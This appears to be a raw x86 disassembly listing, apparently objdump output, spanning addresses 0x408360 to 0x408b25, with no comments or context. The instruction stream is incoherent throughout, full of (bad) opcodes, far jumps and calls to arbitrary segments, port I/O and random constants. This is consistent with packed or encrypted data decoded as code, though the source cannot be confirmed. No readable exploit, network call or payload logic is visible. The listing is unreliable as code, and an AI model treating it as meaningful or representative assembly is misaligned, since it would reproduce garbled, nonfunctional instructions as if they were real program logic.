  408360:	lea    esi,[eax+0x2d]
  408363:	cwde   
  408364:	mov    ebx,esp
  408366:	out    dx,al
  408367:	repz mov eax,0xdd2c341b
  40836d:	sub    DWORD PTR [ecx*4+0x5dc67a7f],edx
  408374:	stos   BYTE PTR es:[edi],al
  408375:	ret    0x3e3a
  408378:	test   DWORD PTR [ebx-0x416be4ed],0x9c0bcb2f
  408382:	fwait
  408383:	cmp    bl,BYTE PTR [eax+eax*4+0x7e]
  408387:	push   ss
  408388:	add    DWORD PTR [edi+0x4623ae84],edx
  40838e:	je     0x408326
  408390:	lods   al,BYTE PTR ds:[esi]
  408391:	pusha  
  408392:	mov    ds:0x27a81bf9,al
  408397:	aas    
  408398:	int3   
  408399:	push   esp
  40839a:	and    ch,al
  40839c:	mov    al,ds:0xe5f2b0d3
  4083a1:	sub    al,BYTE PTR [esi]
  4083a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083a4:	mov    bl,bh
  4083a6:	inc    esi
  4083a7:	jmp    0x217:0x4467e30d
  4083ae:	push   cs
  4083af:	call   0xd44f946d
  4083b4:	inc    ebp
  4083b5:	jae    0x40840a
  4083b7:	enter  0xc9ba,0xff
  4083bb:	cli    
  4083bc:	jmp    0xd893:0xdc377594
  4083c3:	daa    
  4083c4:	(bad)  
  4083c5:	loope  0x408385
  4083c7:	xlat   BYTE PTR ds:[ebx]
  4083c8:	pop    edx
  4083c9:	(bad)  
  4083ca:	push   0x76
  4083cc:	outs   dx,DWORD PTR ds:[esi]
  4083cd:	mov    al,ds:0xcecffb1e
  4083d2:	data16 sar ah,0x79
  4083d6:	retf   
  4083d7:	mov    dl,0xb6
  4083d9:	sbb    DWORD PTR [eax+0x1b],esp
  4083dc:	fld    DWORD PTR [si-0x1078]
  4083e1:	push   edi
  4083e2:	iret   
  4083e3:	repnz mov ebp,0x470fa846
  4083e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083ea:	ret    0x7cc7
  4083ed:	lock ins DWORD PTR es:[edi],dx
  4083ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083f0:	cmc    
  4083f1:	inc    esi
  4083f2:	rol    dl,1
  4083f4:	mov    dh,0x2e
  4083f6:	fbstp  TBYTE PTR [esi]
  4083f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083f9:	daa    
  4083fa:	adc    ecx,DWORD PTR [ebx+0x14]
  4083fd:	scas   eax,DWORD PTR es:[edi]
  4083fe:	mov    edi,0xeb759ee4
  408403:	pop    eax
  408404:	stc    
  408405:	mov    ds:0xe5b700db,al
  40840a:	xlat   BYTE PTR ds:[ebx]
  40840b:	xchg   esi,eax
  40840c:	xor    al,0xb3
  40840e:	out    dx,al
  40840f:	ret    
  408410:	xchg   esi,eax
  408411:	int3   
  408412:	or     BYTE PTR [ecx-0x27],bl
  408415:	dec    ecx
  408416:	sub    edi,DWORD PTR [edi]
  408418:	loop   0x40839b
  40841a:	or     BYTE PTR [ecx],0x9c
  40841d:	popf   
  40841e:	ret    0xfdb7
  408421:	mov    DWORD PTR [edx],ebx
  408423:	fcmovne st,st(3)
  408425:	cmc    
  408426:	es in  eax,0x3f
  408429:	sahf   
  40842a:	cmp    BYTE PTR [ebp-0x63],al
  40842d:	add    eax,DWORD PTR [ecx-0x21c185a8]
  408433:	mov    dh,bh
  408435:	je     0x4083c6
  408437:	cwde   
  408438:	inc    ebp
  408439:	dec    ebp
  40843a:	mov    edi,0xc31a0e9a
  40843f:	mov    ch,0xb4
  408441:	jge    0x4083de
  408443:	jge    0x4084c2
  408445:	cmp    dl,BYTE PTR [ebx]
  408447:	mov    esp,0x97683239
  40844c:	retf   
  40844d:	sbb    BYTE PTR ds:[eax+0x1],ch
  408451:	imul   esi,ecx,0xffffffa7
  408454:	push   ebx
  408455:	sbb    DWORD PTR [ebx],esi
  408457:	cmp    bl,bl
  408459:	outs   dx,DWORD PTR ds:[esi]
  40845a:	into   
  40845b:	sbb    ecx,DWORD PTR [ebp+0xc]
  40845e:	push   es
  40845f:	mov    BYTE PTR [ecx+edi*8],al
  408462:	fsubr  QWORD PTR [eax-0x2647e92a]
  408468:	sbb    eax,DWORD PTR [edi-0x6ceec733]
  40846e:	cmp    DWORD PTR [ecx-0x3c],edi
  408471:	mov    ds:0x4837faa3,eax
  408476:	mov    al,BYTE PTR [ecx]
  408478:	push   0x441175bf
  40847d:	push   ebp
  40847e:	(bad)  
  40847f:	jle    0x4084f5
  408481:	ds xor al,0xb9
  408484:	dec    edx
  408485:	sub    dl,ah
  408487:	bound  edi,QWORD PTR [ebp+0x1d17a4bf]
  40848d:	dec    edi
  40848e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40848f:	xchg   esi,eax
  408490:	out    dx,eax
  408491:	arpl   WORD PTR [edi],cx
  408493:	mov    eax,ds:0xfe791b3
  408498:	mov    bh,BYTE PTR [edx+0x3b]
  40849b:	call   0xfc881f1a
  4084a0:	mov    ds,WORD PTR [ecx+0x6b]
  4084a3:	stc    
  4084a4:	adc    eax,0x44f403c
  4084a9:	call   0x7108:0x2d36e67c
  4084b0:	sub    dl,BYTE PTR [edx]
  4084b2:	xor    eax,0x41d94783
  4084b7:	add    al,0x82
  4084b9:	loop   0x4084b8
  4084bb:	mov    edi,0x328dc81e
  4084c0:	mov    ebx,0xa998454c
  4084c5:	sbb    ecx,DWORD PTR [ebx-0x3010ee31]
  4084cb:	jbe    0x408510
  4084cd:	in     al,dx
  4084ce:	pop    ebx
  4084cf:	adc    edi,DWORD PTR [ebx-0x32]
  4084d2:	fisubr WORD PTR [esi]
  4084d4:	push   esi
  4084d5:	fisttp WORD PTR [ebx]
  4084d7:	dec    esp
  4084d8:	ss inc edx
  4084da:	mov    esp,0x91de0c42
  4084df:	or     al,dl
  4084e1:	mov    al,0xa5
  4084e3:	dec    edi
  4084e4:	or     eax,ebp
  4084e6:	(bad)  
  4084e7:	push   ebp
  4084e8:	out    0xa9,eax
  4084ea:	pop    ebx
  4084eb:	and    al,0x27
  4084ed:	adc    al,0xe7
  4084ef:	xor    eax,0x66bbb0ff
  4084f4:	cmp    BYTE PTR [ebx-0x1e09e896],dl
  4084fa:	jle    0x40849c
  4084fc:	pop    ds
  4084fd:	adc    bh,dh
  4084ff:	int    0x85
  408501:	or     eax,0x3e5744a
  408506:	push   cs
  408507:	in     al,0x4b
  408509:	fcomp  QWORD PTR [esi]
  40850b:	imul   ecx,ebx,0xffffff83
  40850e:	aad    0x3c
  408510:	retf   
  408511:	call   0x5456:0xef8adf66
  408518:	jns    0x40850e
  40851a:	pop    ecx
  40851b:	out    dx,eax
  40851c:	retf   
  40851d:	xor    dh,0xa8
  408520:	aaa    
  408521:	push   eax
  408522:	ffree  st(1)
  408524:	mov    dl,0x1d
  408526:	or     BYTE PTR [eax],ah
  408528:	aad    0xe0
  40852a:	pusha  
  40852b:	jnp    0x4084c1
  40852d:	jns    0x4084dc
  40852f:	(bad)  
  408530:	cmp    bl,BYTE PTR [edx-0x1125f815]
  408536:	into   
  408537:	add    dl,BYTE PTR [eax]
  408539:	dec    edx
  40853a:	jb     0x408516
  40853c:	int    0x7b
  40853e:	rep stos BYTE PTR es:[edi],al
  408540:	daa    
  408541:	adc    esp,DWORD PTR [esi+ecx*8-0x3f4f7441]
  408548:	xchg   edx,eax
  408549:	loope  0x4084e4
  40854b:	jmp    0x4084ce
  40854d:	dec    ecx
  40854e:	sbb    al,0x30
  408550:	adc    BYTE PTR [ebx-0x78b4a05c],0xef
  408557:	test   eax,0xaff9c369
  40855c:	jmp    0x408522
  40855e:	ret    
  40855f:	and    BYTE PTR [edx+eax*8],0x83
  408563:	out    dx,eax
  408564:	and    bl,bh
  408566:	pop    ecx
  408567:	dec    dh
  408569:	or     BYTE PTR [ebp-0x541a279e],dh
  40856f:	nop
  408570:	neg    BYTE PTR [eax-0x6a]
  408573:	cmp    DWORD PTR [ebx],0x4cc40039
  408579:	pop    ebp
  40857a:	imul   esi,DWORD PTR [edx+0x1b4119e2],0x16
  408581:	mov    cl,0x31
  408583:	fcomp  QWORD PTR [ebx]
  408585:	xchg   esp,eax
  408586:	scas   eax,DWORD PTR es:[edi]
  408587:	inc    eax
  408588:	jo     0x40859c
  40858a:	xor    ch,bl
  40858c:	mov    eax,fs:0x62f0123d
  408592:	jno    0x408562
  408594:	scas   eax,DWORD PTR es:[edi]
  408595:	shl    al,cl
  408597:	adc    eax,0x73652e97
  40859c:	not    BYTE PTR ds:0xee6e9289
  4085a2:	mov    ebx,0xf2a17069
  4085a7:	jle    0x40860c
  4085a9:	add    al,ch
  4085ab:	popa   
  4085ac:	push   ecx
  4085ad:	cmp    ah,0xb9
  4085b0:	(bad)  
  4085b1:	mov    cl,0x72
  4085b3:	ffreep st(5)
  4085b5:	fyl2xp1 
  4085b7:	inc    ebp
  4085b8:	das    
  4085b9:	mov    eax,0xb6f8dd4e
  4085be:	fsubr  st(7),st
  4085c0:	sbb    bl,ah
  4085c2:	xchg   eax,edx
  4085c4:	stos   BYTE PTR es:[edi],al
  4085c5:	jl     0x4085ea
  4085c7:	xchg   ebp,eax
  4085c8:	cdq    
  4085c9:	in     al,0x5c
  4085cb:	test   BYTE PTR [ebp+0x62],bh
  4085ce:	adc    eax,0x11b384d5
  4085d3:	mov    edx,0x1b542dd5
  4085d8:	(bad)  
  4085d9:	into   
  4085da:	and    al,0x58
  4085dc:	rcl    BYTE PTR [ebx],cl
  4085de:	inc    ebp
  4085df:	sbb    BYTE PTR [edi+0x52],dl
  4085e2:	mul    DWORD PTR [edx]
  4085e4:	aad    0xe6
  4085e6:	fidivr DWORD PTR [esp+ebp*8+0x51b84e54]
  4085ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085ee:	je     0x408573
  4085f0:	cwde   
  4085f1:	fs pop ecx
  4085f3:	sbb    BYTE PTR [edi],bh
  4085f5:	(bad)  
  4085f6:	stc    
  4085f7:	rcr    cl,1
  4085f9:	push   esi
  4085fa:	aaa    
  4085fb:	fidivr DWORD PTR [ebx+ebp*2-0x2e3fa4f4]
  408602:	xlat   BYTE PTR ds:[ebx]
  408603:	into   
  408604:	jb     0x40864f
  408606:	jl     0x408642
  408608:	add    edx,0x162ad1b1
  40860e:	xchg   ebp,eax
  40860f:	(bad)  [edi]
  408611:	retf   
  408612:	xchg   DWORD PTR [ebp+0x2e2e388d],ebx
  408618:	sahf   
  408619:	clc    
  40861a:	scas   eax,DWORD PTR es:[edi]
  40861b:	hlt    
  40861c:	gs lahf 
  40861e:	pop    ss
  40861f:	clc    
  408620:	jbe    0x40867f
  408622:	adc    al,0x4e
  408624:	and    al,0xda
  408626:	inc    ecx
  408627:	sbb    al,0xc2
  408629:	push   esi
  40862a:	cli    
  40862b:	lahf   
  40862c:	or     ch,BYTE PTR [eax-0x73a09a16]
  408632:	add    dh,BYTE PTR [eax]
  408634:	add    eax,0x96530e07
  408639:	add    ebx,DWORD PTR [edi+0x6196f2b3]
  40863f:	jp     0x4086a9
  408641:	ins    BYTE PTR es:[edi],dx
  408642:	pop    ecx
  408643:	bound  esi,QWORD PTR [edx-0x61e944a7]
  408649:	(bad)  
  40864a:	mov    edi,0x50d9da23
  40864f:	enter  0x51df,0xb
  408653:	xchg   esi,eax
  408654:	inc    esi
  408655:	cmc    
  408656:	mov    eax,0x378397dd
  40865b:	popf   
  40865c:	dec    edx
  40865d:	adc    ebx,DWORD PTR [eax]
  40865f:	mov    ch,BYTE PTR [esi+0x47ac5cdb]
  408665:	pop    ss
  408666:	adc    BYTE PTR ds:0x4e434a7b,bh
  40866c:	pop    eax
  40866d:	sbb    edx,DWORD PTR [ebp+0x65]
  408670:	cdq    
  408671:	inc    BYTE PTR [ebp-0x33]
  408674:	retf   0xf5bc
  408677:	inc    edx
  408678:	mov    bh,0x9a
  40867a:	inc    esp
  40867b:	outs   dx,BYTE PTR ds:[esi]
  40867c:	fs scas eax,DWORD PTR es:[edi]
  40867e:	data16 sbb ch,BYTE PTR ss:[esi]
  408682:	push   ebx
  408683:	sbb    eax,0x942c95b2
  408688:	imul   ebp,DWORD PTR [ebx-0x34dc8802],0x5f76a2f8
  408692:	rcr    BYTE PTR [ecx],1
  408694:	int    0x36
  408696:	sbb    eax,0x1068e026
  40869b:	add    DWORD PTR [eax-0x79c2e60d],edi
  4086a1:	add    DWORD PTR [ebp+0x29],edx
  4086a4:	mov    ch,0x23
  4086a6:	int3   
  4086a7:	mov    ecx,0xaa591ff9
  4086ac:	call   0x2170e1ff
  4086b1:	idiv   WORD PTR [ebx-0xb9914bd]
  4086b8:	pop    ebx
  4086b9:	mov    al,ds:0x1db03e90
  4086be:	mov    cl,0x7d
  4086c0:	lods   al,BYTE PTR ds:[esi]
  4086c1:	xor    bl,bh
  4086c3:	add    BYTE PTR [ebp+0x21],dl
  4086c6:	iret   
  4086c7:	cdq    
  4086c8:	sub    BYTE PTR [ecx+0x416fc1d0],bh
  4086ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086cf:	(bad)  
  4086d0:	andnps xmm1,XMMWORD PTR ds:0xc7fc7b5d
  4086d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086d8:	push   ecx
  4086d9:	shr    DWORD PTR [ebp+0x47bb2b89],1
  4086df:	cmp    BYTE PTR [ebp+0x26ecf2c4],al
  4086e5:	into   
  4086e6:	test   eax,0xa3f93f48
  4086eb:	sub    al,0xe7
  4086ed:	loopne 0x408767
  4086ef:	(bad)  
  4086f1:	or     DWORD PTR [eax],edi
  4086f3:	lds    ecx,FWORD PTR [edi+eiz*2]
  4086f6:	pop    edx
  4086f7:	out    dx,eax
  4086f8:	push   ss
  4086f9:	jns    0x4086bd
  4086fb:	lods   eax,DWORD PTR ds:[esi]
  4086fc:	leave  
  4086fd:	add    BYTE PTR [esi],dl
  4086ff:	popa   
  408700:	or     al,0x5
  408702:	xlat   BYTE PTR ds:[ebx]
  408703:	into   
  408704:	dec    esi
  408705:	lahf   
  408706:	push   ds
  408707:	or     al,0x4d
  408709:	in     eax,0x36
  40870b:	retf   0x5313
  40870e:	dec    eax
  40870f:	mov    al,ah
  408711:	mov    esp,0xfb618406
  408716:	cwde   
  408717:	xchg   edi,eax
  408718:	shl    BYTE PTR [edx+eax*2],cl
  40871b:	sub    ecx,DWORD PTR [edx+eiz*8]
  40871e:	pop    ebx
  40871f:	mov    al,ds:0x29c9abbd
  408724:	or     eax,0x4e514ade
  408729:	or     eax,DWORD PTR [ecx+0x54f1fb89]
  40872f:	data16 mov dl,0xb0
  408732:	stc    
  408733:	dec    ecx
  408734:	test   ah,dh
  408736:	sbb    edi,DWORD PTR [eax-0x7a3af30f]
  40873c:	mov    esp,DWORD PTR ds:0xed846204
  408742:	mov    ebp,0x7de3e1e8
  408747:	jns    0x40876e
  408749:	jne    0x408748
  40874b:	les    ebp,FWORD PTR [ebx]
  40874d:	pop    esp
  40874e:	rol    DWORD PTR gs:[esi+0x2d],cl
  408752:	jle    0x408739
  408754:	(bad)  
  408755:	in     eax,dx
  408756:	adc    BYTE PTR [edi],dh
  408758:	out    dx,eax
  408759:	adc    eax,0x22c99688
  40875e:	or     DWORD PTR ds:0xf2139dc8,esp
  408764:	inc    ebp
  408765:	pop    ebx
  408766:	retf   0x2ff2
  408769:	xor    DWORD PTR [eax-0x56],edx
  40876c:	cmp    eax,0xb5a69497
  408771:	(bad)  
  408772:	push   esp
  408773:	mov    ch,0xc6
  408775:	or     esi,eax
  408777:	jbe    0x40873a
  408779:	jg     0x40874b
  40877b:	push   es
  40877c:	push   0xfffffffb
  40877e:	pop    eax
  40877f:	sbb    al,BYTE PTR [ecx-0x50d271bc]
  408785:	fs push es
  408787:	or     BYTE PTR [edi],al
  408789:	and    BYTE PTR [ebx-0x13],dh
  40878c:	inc    edx
  40878d:	outs   dx,BYTE PTR ds:[esi]
  40878e:	or     ebp,DWORD PTR [ebp+0x4c3d16b4]
  408794:	push   es
  408795:	adc    al,0xfe
  408797:	mov    edx,0x59053f28
  40879c:	(bad)  
  40879d:	icebp  
  40879e:	ins    DWORD PTR es:[edi],dx
  40879f:	ja     0x4087ac
  4087a1:	adc    DWORD PTR ds:0xaf8de604,0x2e
  4087a8:	es call 0x94c0:0x718c3027
  4087b0:	fisubr DWORD PTR [edi+0x11f93308]
  4087b6:	cmp    al,0x84
  4087b8:	jmp    0x40878c
  4087ba:	dec    ebx
  4087bb:	jnp    0x40879f
  4087bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087be:	lods   al,BYTE PTR ds:[esi]
  4087bf:	mov    ds:0xc2c8df53,eax
  4087c4:	dec    edi
  4087c5:	ja     0x408830
  4087c7:	cwde   
  4087c8:	lds    edi,FWORD PTR [eax]
  4087ca:	jmp    0x4087eb
  4087cc:	xchg   edi,eax
  4087cd:	or     al,ch
  4087cf:	add    al,0x2b
  4087d1:	sahf   
  4087d2:	mov    bl,dh
  4087d4:	cli    
  4087d5:	or     esp,esp
  4087d7:	adc    al,0x32
  4087d9:	rcr    BYTE PTR [ecx],0x48
  4087dc:	stc    
  4087dd:	add    al,0x64
  4087df:	aaa    
  4087e0:	mov    ch,0xb3
  4087e2:	push   eax
  4087e3:	and    BYTE PTR [esi+0x54],ch
  4087e6:	push   edx
  4087e7:	mov    edi,0xd56158f9
  4087ec:	dec    edi
  4087ed:	mov    ds:0x62462a7f,al
  4087f2:	(bad)  
  4087f4:	sahf   
  4087f5:	jmp    0x1826:0xb5e9ce15
  4087fc:	jmp    0xb204:0x1bc9f587
  408803:	xor    eax,0xb73a33b1
  408808:	add    dl,dh
  40880a:	dec    edx
  40880b:	push   ecx
  40880d:	out    0x43,al
  40880f:	sar    DWORD PTR [ebx-0x1f],1
  408812:	inc    esi
  408813:	popa   
  408814:	xor    ebx,esi
  408816:	test   DWORD PTR [esi+edi*4+0x7a],0x7f5efc60
  40881e:	add    DWORD PTR ds:0x59967f9c,ecx
  408824:	xchg   esp,eax
  408825:	mov    al,ds:0x70d2be02
  40882a:	je     0x4088a9
  40882c:	adc    BYTE PTR [ebp-0x79],dh
  40882f:	daa    
  408830:	repz mov dh,0x71
  408833:	sbb    edx,DWORD PTR [edi+eiz*2-0x43]
  408837:	mov    BYTE PTR [edi-0x5c],ch
  40883a:	out    0xd9,al
  40883c:	push   cs
  40883d:	vpshaw ymm13,ss:[edi+0x6ecf5687],xmm5
  408847:	add    BYTE PTR [edx],0xf1
  40884a:	(bad)  
  40884b:	mov    edi,0x56fd46d3
  408850:	test   eax,0xc87322f0
  408855:	sub    BYTE PTR [ecx+0x56233a8],bh
  40885b:	ret    0xe2a
  40885e:	sub    bl,BYTE PTR [edi-0x58]
  408861:	jo     0x408871
  408863:	int    0xf
  408865:	(bad)  
  408866:	call   0x12ab:0xb5d8d83d
  40886d:	sbb    eax,0x29b80aab
  408872:	push   0xd2ff51d9
  408877:	repnz xchg ecx,eax
  408879:	mov    al,ds:0x46a483a1
  40887e:	lods   al,BYTE PTR ds:[esi]
  40887f:	cs pop edi
  408881:	ficom  WORD PTR [eax+0x1b]
  408884:	mov    eax,ds:0xa6a55c41
  408889:	sahf   
  40888a:	mov    edi,0x3a5cc7df
  40888f:	cmp    al,ch
  408891:	mov    dl,0x72
  408893:	sub    al,0xc2
  408895:	aad    0xf9
  408897:	mov    edx,0x6a83b8f1
  40889c:	sub    DWORD PTR [ebp+0x4a1aa431],edx
  4088a2:	cmp    al,BYTE PTR [edi+0x152cdf83]
  4088a8:	xchg   edx,ebp
  4088aa:	imul   ecx,esp,0x4a
  4088ad:	jge    0x408860
  4088af:	jns    0x4088c9
  4088b1:	jns    0x4088ce
  4088b3:	imul   eax,edi,0x7e
  4088b6:	mov    ch,0xa6
  4088b8:	mov    DWORD PTR [edi+0xf],ebx
  4088bb:	push   edi
  4088bc:	sbb    dl,dl
  4088be:	fdivr  DWORD PTR [ebp+0x11f8ace6]
  4088c4:	dec    esp
  4088c5:	mov    ebp,0x6d3b909a
  4088ca:	dec    esi
  4088cb:	test   bh,dh
  4088cd:	outs   dx,DWORD PTR ds:[esi]
  4088ce:	pop    esi
  4088cf:	add    al,0x3
  4088d1:	fimul  WORD PTR [ebx+0x2a]
  4088d4:	push   ebx
  4088d5:	xchg   esi,edi
  4088d7:	outs   dx,DWORD PTR ds:[esi]
  4088d8:	xchg   esi,eax
  4088d9:	dec    esp
  4088da:	inc    ecx
  4088dc:	jno    0x408954
  4088de:	imul   esp,eax,0x1c5a5ae8
  4088e4:	sbb    ebx,DWORD PTR [ecx+0x54]
  4088e7:	icebp  
  4088e8:	mov    ch,0xd1
  4088ea:	cmp    edx,edi
  4088ec:	aaa    
  4088ed:	test   DWORD PTR [ecx+0x43],edx
  4088f0:	push   ebp
  4088f1:	sbb    ecx,ecx
  4088f3:	dec    eax
  4088f4:	dec    esi
  4088f5:	jl     0x408972
  4088f7:	jne    0x4088de
  4088f9:	mov    ebp,0xd5f62a7d
  4088fe:	mov    al,0x42
  408900:	cmp    BYTE PTR ds:0x7ae3cf3f,cl
  408906:	mov    fs,WORD PTR [esi]
  408908:	inc    edx
  408909:	xchg   edi,eax
  40890a:	add    al,0x74
  40890c:	jp     0x4088d6
  40890e:	cdq    
  40890f:	push   0xac169ea6
  408914:	call   0xe7ed:0xef15e27c
  40891b:	or     DWORD PTR [eax-0x31],esp
  40891e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40891f:	mov    esp,0xa4388b04
  408924:	mov    ebx,DWORD PTR [esi]
  408926:	stos   DWORD PTR es:[edi],eax
  408927:	sub    BYTE PTR [edx+0x3b355da],0x91
  40892e:	push   ss
  40892f:	push   eax
  408930:	add    esp,ebx
  408932:	push   esp
  408933:	mov    dl,dh
  408935:	sub    bl,BYTE PTR [ebp+0x6f27a657]
  40893b:	mov    BYTE PTR [ebx+0x58],bh
  40893e:	imul   edx,DWORD PTR [ebp+ebx*8-0x65],0xffffff8e
  408943:	cmp    al,BYTE PTR [ebp+0x3f]
  408946:	push   es
  408947:	mov    bl,bh
  408949:	iret   
  40894a:	rcl    BYTE PTR [ecx-0x44],cl
  40894d:	aad    0x23
  40894f:	leave  
  408950:	dec    edi
  408951:	inc    ebx
  408952:	retf   
  408953:	jae    0x408941
  408955:	xchg   esi,eax
  408956:	xchg   BYTE PTR [ecx-0x1b],ch
  408959:	test   al,0xc5
  40895b:	call   0xcf5e:0x27e6325f
  408962:	mov    ebp,0xe2e74855
  408967:	xchg   DWORD PTR ds:0xad6e0e37,esp
  40896d:	mov    ebx,0x38da6e97
  408972:	(bad)  [ecx+0x1390b441]
  408978:	das    
  408979:	fadd   st,st(6)
  40897b:	mov    cl,0x83
  40897d:	pop    DWORD PTR [eax]
  40897f:	pop    ecx
  408980:	mov    eax,DWORD PTR [edx-0x5e]
  408983:	xchg   ebx,eax
  408984:	gs test al,0xae
  408987:	sbb    al,ch
  408989:	fdiv   DWORD PTR [esi-0x68]
  40898c:	test   eax,0x813d3ad5
  408991:	lock lds esi,FWORD PTR [esi]
  408994:	mov    eax,ds:0xf4fada18
  408999:	jno    0x4089f0
  40899b:	mov    esp,0x48345038
  4089a0:	and    al,0xcb
  4089a2:	dec    esi
  4089a3:	jbe    0x4089af
  4089a5:	ret    
  4089a6:	sbb    BYTE PTR [eax-0x54f2ace4],bl
  4089ac:	mov    cl,0x3
  4089ae:	pop    eax
  4089af:	out    0xce,eax
  4089b1:	or     DWORD PTR [ebx+0x7e5df042],edx
  4089b7:	icebp  
  4089b8:	mov    eax,ds:0x96bf418
  4089bd:	sahf   
  4089be:	pop    edx
  4089bf:	aam    0x54
  4089c1:	adc    ebx,esi
  4089c3:	adc    al,0x7a
  4089c5:	aas    
  4089c6:	jnp    0x4089e2
  4089c8:	outs   dx,DWORD PTR ds:[esi]
  4089c9:	cli    
  4089ca:	in     eax,0x98
  4089cc:	lods   eax,DWORD PTR ds:[esi]
  4089cd:	out    0x53,al
  4089cf:	mov    bh,dh
  4089d1:	dec    DWORD PTR [ebp+0x3b54ce43]
  4089d7:	hlt    
  4089d8:	ins    DWORD PTR es:[edi],dx
  4089d9:	fwait
  4089da:	cmpps  xmm4,XMMWORD PTR [ebp+0x11],0xa2
  4089df:	inc    esi
  4089e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089e1:	cdq    
  4089e2:	push   eax
  4089e3:	inc    ebp
  4089e4:	xor    eax,0x4ce20e1e
  4089e9:	lods   eax,DWORD PTR ds:[esi]
  4089ea:	test   eax,0xceb2e222
  4089ef:	mov    ds:0xa0fbb2be,al
  4089f4:	mov    ah,0x7d
  4089f6:	push   ecx
  4089f7:	push   si
  4089f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089fa:	dec    edi
  4089fb:	jecxz  0x408a6e
  4089fd:	dec    esi
  4089fe:	mov    eax,0xad7407c0
  408a03:	call   0xc45c:0x20d55b13
  408a0a:	pushf  
  408a0b:	inc    eax
  408a0c:	push   esp
  408a0d:	jecxz  0x4089b3
  408a0f:	(bad)  
  408a10:	fisttp DWORD PTR [ebx]
  408a12:	ins    DWORD PTR es:[edi],dx
  408a13:	xchg   ebx,eax
  408a14:	adc    al,0xe3
  408a16:	je     0x408a0b
  408a18:	mov    edx,0x4446f5c7
  408a1d:	loopne 0x408a62
  408a1f:	pop    edi
  408a20:	pop    ebx
  408a21:	and    BYTE PTR [esi+0x6a],0xe9
  408a25:	in     eax,dx
  408a26:	push   eax
  408a27:	add    al,0xb2
  408a29:	xor    al,0x2b
  408a2b:	ror    BYTE PTR [edi],cl
  408a2d:	push   eax
  408a2e:	je     0x408aa7
  408a30:	xlat   BYTE PTR ds:[ebx]
  408a31:	loop   0x408a63
  408a33:	fs aam 0x26
  408a36:	dec    ebp
  408a37:	fdivr  st(7),st
  408a39:	in     al,0x5c
  408a3b:	fwait
  408a3c:	cld    
  408a3d:	leave  
  408a3e:	in     al,dx
  408a3f:	dec    esi
  408a40:	scas   al,BYTE PTR es:[edi]
  408a41:	stos   BYTE PTR es:[edi],al
  408a42:	cli    
  408a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a44:	xchg   BYTE PTR [esi+ecx*2],ah
  408a47:	jp     0x4089e7
  408a49:	push   ebx
  408a4a:	sbb    al,0xaa
  408a4c:	mov    cl,0x49
  408a4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a4f:	fcmovnb st,st(4)
  408a51:	add    esi,DWORD PTR [ebx+ecx*8-0xf]
  408a55:	repz add dl,dh
  408a58:	jo     0x408ab7
  408a5a:	in     al,0xdd
  408a5c:	sub    ebx,DWORD PTR [edx+0x74]
  408a5f:	cmp    eax,0x6a038b4a
  408a64:	jbe    0x408a3a
  408a66:	call   0xcf21f8ce
  408a6b:	pop    esp
  408a6c:	or     al,0x5d
  408a6e:	adc    ah,ah
  408a70:	cmp    edx,DWORD PTR [ecx-0xde3cdac]
  408a76:	and    eax,0x528a6310
  408a7b:	xor    DWORD PTR [ebp-0x60d461bf],edx
  408a81:	push   ebx
  408a82:	and    DWORD PTR [ebp+ebx*4-0x258e2de],ebp
  408a89:	enter  0xdbb8,0xbc
  408a8d:	shr    bh,0x21
  408a90:	cmp    ch,BYTE PTR [eax+eax*2+0x17]
  408a94:	jbe    0x408a2b
  408a96:	clc    
  408a97:	inc    ebp
  408a98:	push   eax
  408a99:	stos   BYTE PTR es:[edi],al
  408a9a:	popa   
  408a9b:	imul   si,WORD PTR [ebx-0x157ee510],0xff97
  408aa3:	xchg   edx,eax
  408aa4:	xchg   ebp,eax
  408aa5:	pop    eax
  408aa6:	sub    esi,DWORD PTR [edx-0x61]
  408aa9:	mov    WORD PTR [ebp+0x58aa6770],ss
  408aaf:	fcomi  st,st(6)
  408ab1:	outs   dx,BYTE PTR ds:[esi]
  408ab2:	fdivp  st(6),st
  408ab4:	pop    eax
  408ab5:	cwde   
  408ab6:	scas   eax,DWORD PTR es:[edi]
  408ab7:	xchg   esi,eax
  408ab8:	fmul   DWORD PTR [edx-0x367db6e0]
  408abe:	pushf  
  408abf:	(bad)  
  408ac0:	push   ecx
  408ac1:	loop   0x408a73
  408ac3:	push   ebx
  408ac4:	rol    DWORD PTR es:[edx-0x45],0x43
  408ac9:	pop    ecx
  408aca:	fiadd  DWORD PTR [edx]
  408acc:	icebp  
  408acd:	cmp    BYTE PTR ds:0xb02d2f33,cl
  408ad3:	mov    edi,0x79be6c9c
  408ad8:	aad    0xe7
  408ada:	in     eax,0xbe
  408adc:	mov    dh,0x7
  408ade:	mov    esp,0xdc9291ec
  408ae3:	inc    edx
  408ae4:	ficomp WORD PTR [edx-0x62]
  408ae7:	ins    DWORD PTR es:[edi],dx
  408ae8:	jb     0x408b01
  408aea:	leave  
  408aeb:	(bad)  
  408aec:	push   eax
  408aed:	test   al,0x51
  408aef:	icebp  
  408af0:	inc    esi
  408af1:	mov    eax,0x83472a6b
  408af6:	mov    al,ds:0x71d12fc6
  408afb:	xor    ebx,DWORD PTR [ebp-0x32]
  408afe:	jl     0x408aaf
  408b00:	pop    ebx
  408b01:	adc    eax,DWORD PTR [esi+0x586c1cde]
  408b07:	dec    ebp
  408b08:	iret   
  408b09:	ins    BYTE PTR es:[edi],dx
  408b0a:	(bad)  
  408b0b:	jmp    0xfbb7:0x34bd1808
  408b12:	(bad)  
  408b13:	loope  0x408b6e
  408b15:	repz jb 0x408b1b
  408b18:	aaa    
  408b19:	cmp    DWORD PTR [edi],ecx
  408b1b:	popa   
  408b1c:	cdq    
  408b1d:	int    0xde
  408b1f:	xlat   BYTE PTR ds:[ebx]
  408b20:	or     eax,0x23910726
  408b25:	popf   
